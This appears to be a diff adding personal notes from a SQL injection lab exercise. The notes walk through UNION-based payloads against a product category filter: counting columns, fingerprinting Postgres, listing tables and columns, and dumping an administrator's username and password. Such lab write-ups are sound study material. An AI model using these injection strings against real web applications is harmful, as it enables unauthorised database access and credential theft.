@@ -1,0 +1,37 @@
+SQL injection - product category filter
+Goal: Listing database contents of non-oracle databases
+
+-Which table contains usernames and passwords?
+-Discover the relevant columns
+-Output the content of the table
+-Login as the adminsitrator
+
+Analysis:
+
+1. Determine number of columns
+filter?category=Gifts' order by 1--
+filter?category=Gifts' order by 2--
+filter?category=Gifts' order by 3-- -> Results in internal server error, so 2 only
+
+2. Determine data type of columns
+
+select a, b from products where category='Gifts'
+' UNION select 'a', NULL--
+' UNION select 'NULL', 'a'-- -> second is type string
+
+3. Discover the version of the database
+' UNION SELECT @@version, NULL-- -> error no MS
+' UNION SELECT version(), NULL-- -> Worked, is Postgres
+
+4. Get table names
+' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='public'--
+-> users_gkfqzn
+
+5. Get column names
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_gkfqzn'--
+-> username_dmyjez, password_bhcbtb
+
+6. Run Query
+Gifts' UNION SELECT username_dmyjez, password_bhcbtb FROM users_gkfqzn--
+administrator
+8ckzkk6gq01eifvvgxf7
